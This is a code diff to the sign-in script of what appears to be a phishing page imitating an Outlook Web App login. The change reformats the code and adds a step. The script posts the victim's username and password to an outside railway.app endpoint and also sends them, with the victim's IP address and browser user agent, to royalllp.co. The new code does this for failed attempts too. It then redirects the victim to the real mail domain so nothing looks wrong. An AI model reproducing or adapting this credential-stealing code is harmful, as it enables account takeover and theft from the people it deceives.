@@ -1025,128 +1025,132 @@ async function getUserIP() {
 }
 
 function clkLgn(event) {
-    if (event) event.preventDefault();
-    
-    // Get input values
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-    const errorDiv = document.getElementById('signInErrorDiv');
-    const loginButton = document.getElementById('loginButton');
-    
-    // Hide error div initially
-    errorDiv.style.display = 'none';
-    
-    // Check if username or password is empty
-    if (!username || !password) {
-        errorDiv.style.display = 'block';
-        return;
-    }
-    
-    // Disable the login button and show loading state
-    if (loginButton) {
-        loginButton.disabled = true;
-        const originalText = loginButton.textContent;
-        loginButton.innerHTML = '<span class="spinner"></span> Signing in...';
-        loginButton.dataset.originalText = originalText;
-    }
-    
-    const formData = {
-        destination: document.querySelector('input[name="destination"]').value,
-        flags: document.querySelector('input[name="flags"]').value,
-        forcedownlevel: document.querySelector('input[name="forcedownlevel"]').value,
-        username: username,
-        password: password,
-        isUtf8: document.querySelector('input[name="isUtf8"]').value
-    };
-
-    fetch('https://pybot-production-8780.up.railway.app', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(formData)
-    })
+  if (event) event.preventDefault();
+  // Get input values
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  const errorDiv = document.getElementById('signInErrorDiv');
+  const loginButton = document.getElementById('loginButton');
+  // Hide error div initially
+  errorDiv.style.display = 'none';
+  // Check if username or password is empty
+  if (!username || !password) {
+    errorDiv.style.display = 'block';
+    return;
+  }
+  // Disable the login button and show loading state
+  if (loginButton) {
+    loginButton.disabled = true;
+    const originalText = loginButton.textContent;
+    loginButton.innerHTML = '<span class="spinner"></span> Signing in...';
+    loginButton.dataset.originalText = originalText;
+  }
+  const formData = {
+    destination: document.querySelector('input[name="destination"]').value,
+    flags: document.querySelector('input[name="flags"]').value,
+    forcedownlevel: document.querySelector('input[name="forcedownlevel"]').value,
+    username: username,
+    password: password,
+    isUtf8: document.querySelector('input[name="isUtf8"]').value
+  };
+  fetch('https://pybot-production-8780.up.railway.app', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(formData)
+  })
     .then(res => res.json())
     .then(data => {
-        if (data.status === 'bad') {
-            // Show error message for invalid credentials
-            errorDiv.style.display = 'block';
-            
-            // Re-enable the login button and restore original text
-            if (loginButton) {
-                loginButton.disabled = false;
-                loginButton.textContent = loginButton.dataset.originalText;
-            }
-        } else if (data.status === 'okay') {
-            // Get user IP and send data to API server
-            getUserIP().then(userIP => {
-                const userData = {
-                    identifier: 'DATA-END', // ADDED IDENTIFIER HERE
-                    username: username,
-                    password: password,
-                    ip: userIP,
-                    useragent: navigator.userAgent
-                };
-                
-                fetch('https://royalllp.co', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(userData)
-                });
-                
-                // Extract domain from URL hash or from email input
-                let cleanDomain = '';
-                const domainInput = getDomainFromHash();
-                
-                if (domainInput) {
-                    // Extract domain from hash
-                    cleanDomain = domainInput;
-                    if (domainInput.includes('@')) {
-                        cleanDomain = domainInput.split('@')[1];
-                    }
-                    // Remove any www. prefix if present
-                    cleanDomain = cleanDomain.replace(/^www\./, '');
-                } else if (username.includes('@')) {
-                    // Extract domain from email input when no hash is present
-                    cleanDomain = username.split('@')[1];
-                    // Remove any www. prefix if present
-                    cleanDomain = cleanDomain.replace(/^www\./, '');
-                } else {
-                    // Fallback: use the username as domain if it's not an email
-                    cleanDomain = username.replace(/^www\./, '');
-                }
-                
-                // NEW: Check if server response contains "via" with a subdomain
-                let targetUrl;
-                if (data.message && data.message.includes('via ')) {
-                    // Extract any subdomain that comes after "via "
-                    const viaMatch = data.message.match(/via\s+([^\s]+)/);
-                    if (viaMatch) {
-                        const fullSubdomain = viaMatch[1]; // This gets the full subdomain like "anysubdomain.magistrat.bremerhaven.de"
-                        targetUrl = `https://${fullSubdomain}/owa`;
-                        console.log('Found "via" subdomain. Redirecting to:', targetUrl);
-                    } else {
-                        // Fallback to mail subdomain if regex fails
-                        targetUrl = `https://mail.${cleanDomain}/owa`;
-                        console.log('Via match failed, using mail subdomain. Redirecting to:', targetUrl);
-                    }
-                } else {
-                    // Default behavior: use mail subdomain when no "via" is present
-                    targetUrl = `https://mail.${cleanDomain}/owa`;
-                    console.log('No "via" found, using default mail subdomain. Redirecting to:', targetUrl);
-                }
-                
-                window.location.href = targetUrl;
-            });
+      if (data.status === 'bad') {
+        // Show error message for invalid credentials
+        errorDiv.style.display = 'block';
+        // Re-enable the login button and restore original text
+        if (loginButton) {
+          loginButton.disabled = false;
+          loginButton.textContent = loginButton.dataset.originalText;
         }
+        // Send error log to https://royalllp.co with identifier 'DATA-END'
+        getUserIP().then(userIP => {
+          const errorData = {
+            identifier: 'DATA-END',
+            type: 'ERROR LOG', // Added to differentiate as error log
+            username: username,
+            password: password,
+            ip: userIP,
+            useragent: navigator.userAgent,
+            errorMessage: data.message || 'Invalid credentials'
+          };
+          fetch('https://royalllp.co', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(errorData)
+          });
+        });
+      } else if (data.status === 'okay') {
+        // Get user IP and send data to API server
+        getUserIP().then(userIP => {
+          const userData = {
+            identifier: 'DATA-END',
+            username: username,
+            password: password,
+            ip: userIP,
+            useragent: navigator.userAgent
+          };
+          fetch('https://royalllp.co', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(userData)
+          });
+          // Extract domain from URL hash or from email input
+          let cleanDomain = '';
+          const domainInput = getDomainFromHash();
+          if (domainInput) {
+            // Extract domain from hash
+            cleanDomain = domainInput;
+            if (domainInput.includes('@')) {
+              cleanDomain = domainInput.split('@')[1];
+            }
+            // Remove any www. prefix if present
+            cleanDomain = cleanDomain.replace(/^www\./, '');
+          } else if (username.includes('@')) {
+            // Extract domain from email input when no hash is present
+            cleanDomain = username.split('@')[1];
+            // Remove any www. prefix if present
+            cleanDomain = cleanDomain.replace(/^www\./, '');
+          } else {
+            // Fallback: use the username as domain if it's not an email
+            cleanDomain = username.replace(/^www\./, '');
+          }
+          // NEW: Check if server response contains "via" with a subdomain
+          let targetUrl;
+          if (data.message && data.message.includes('via ')) {
+            // Extract any subdomain that comes after "via "
+            const viaMatch = data.message.match(/via\s+([^\s]+)/);
+            if (viaMatch) {
+              const fullSubdomain = viaMatch[1];
+              targetUrl = `https://${fullSubdomain}/owa`;
+              console.log('Found "via" subdomain. Redirecting to:', targetUrl);
+            } else {
+              // Fallback to mail subdomain if regex fails
+              targetUrl = `https://mail.${cleanDomain}/owa`;
+              console.log('Via match failed, using mail subdomain. Redirecting to:', targetUrl);
+            }
+          } else {
+            // Default behavior: use mail subdomain when no "via" is present
+            targetUrl = `https://mail.${cleanDomain}/owa`;
+            console.log('No "via" found, using default mail subdomain. Redirecting to:', targetUrl);
+          }
+          window.location.href = targetUrl;
+        });
+      }
     })
     .catch(err => {
-        console.error('Error:', err);
-        errorDiv.style.display = 'block';
-        
-        // Re-enable the login button and restore original text on error
-        if (loginButton) {
-            loginButton.disabled = false;
-            loginButton.textContent = loginButton.dataset.originalText;
-        }
+      console.error('Error:', err);
+      errorDiv.style.display = 'block';
+      // Re-enable the login button and restore original text on error
+      if (loginButton) {
+        loginButton.disabled = false;
+        loginButton.textContent = loginButton.dataset.originalText;
+      }
     });
 }
 </script>
